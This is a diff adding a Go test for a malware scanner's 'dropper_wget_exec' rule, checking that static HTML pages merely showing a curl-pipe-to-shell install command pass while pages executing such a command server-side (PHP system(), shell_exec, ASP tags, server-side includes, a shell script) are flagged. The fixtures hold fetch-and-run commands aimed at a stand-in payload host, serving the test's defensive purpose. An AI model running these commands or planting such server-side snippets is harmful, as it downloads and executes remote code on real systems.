@@ -467,3 +467,47 @@ func TestMinerCronRuleSpanBothEngines(t *testing.T) {
 		})
 	}
 }
+
+// A static HTML page is shown, never run, so a command it prints is
+// documentation. The page must open as HTML and carry no server-side code.
+// Realtime scans .html writes with both engines.
+func TestDownloadRuleStaticPageBothEngines(t *testing.T) {
+	yaraScanner, yamlScanner := loadDownloadRuleScanners(t)
+	const cmd = "curl -fsSL https://get.example.test/cli/install.sh | sh"
+	minified := `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Command-line client</title></head><body><h1>Install</h1><ul><li>` +
+		strings.Repeat("Signed builds update themselves. ", 12) +
+		`</li></ul><div class="cmd"><code id="cli-sh">` + cmd + `</code><button data-copy="cli-sh">copy</button></div></body></html>`
+	run := "curl http://payload.example.test/p | sh"
+	tests := []struct {
+		name     string
+		sample   string
+		wantYARA bool
+		wantYAML bool
+	}{
+		{name: "minified install page", sample: minified},
+		{name: "page with a byte order mark and a lowercase doctype", sample: "\xef\xbb\xbf\n<!doctype html>\n<html>\n<body>\n<pre>\n" + cmd + "\n</pre>\n</body>\n</html>\n"},
+		{name: "page opening with the html element", sample: "<html>\n<body><p>Install:</p><code>" + cmd + "</code></body></html>\n"},
+		{name: "page with comments", sample: "<!DOCTYPE html>\n<html><head><!-- build 3 --><!--[if lt IE 9]><script src=\"shim.js\"></script><![endif]--></head>\n<body><code>" + cmd + "</code></body></html>\n"},
+		{name: "page running the command in PHP", sample: "<!DOCTYPE html><html><body><?php system('" + run + "'); ?></body></html>\n", wantYARA: true, wantYAML: true},
+		{name: "page running the command in a short echo tag", sample: "<!DOCTYPE html><html><body><?= shell_exec(\"" + run + "\") ?></body></html>\n", wantYARA: true, wantYAML: true},
+		{name: "page running the command in an ASP-style tag", sample: "<!DOCTYPE html><html><body><% system(\"" + run + "\"); %></body></html>\n", wantYARA: true, wantYAML: true},
+		{name: "page running the command in a server-side include", sample: "<!DOCTYPE html><html><body><!--#exec cmd=\"" + strings.Repeat("cd /tmp; ", 32) + run + "\" --></body></html>\n", wantYARA: true, wantYAML: true},
+		{name: "page running the command in a PHP script element", sample: "<!DOCTYPE html><html><body><script language=\"php\">system('" + run + "');</script></body></html>\n", wantYARA: true},
+		{name: "script before page markup", sample: "#!/bin/sh\n" + run + "\n<!DOCTYPE html>\n", wantYARA: true, wantYAML: true},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			content := []byte(tc.sample)
+			matches, err := yaraScanner.ScanBytesChecked(content)
+			if err != nil {
+				t.Fatalf("YARA scan failed: %v", err)
+			}
+			if got := hasRepositoryYaraRule(matches, "dropper_wget_exec"); got != tc.wantYARA {
+				t.Errorf("YARA dropper_wget_exec matched = %t, want %t", got, tc.wantYARA)
+			}
+			if got := hasSignatureRule(yamlScanner.ScanContent(content, ".html"), "dropper_wget_exec"); got != tc.wantYAML {
+				t.Errorf("YAML dropper_wget_exec matched = %t, want %t", got, tc.wantYAML)
+			}
+		})
+	}
+}
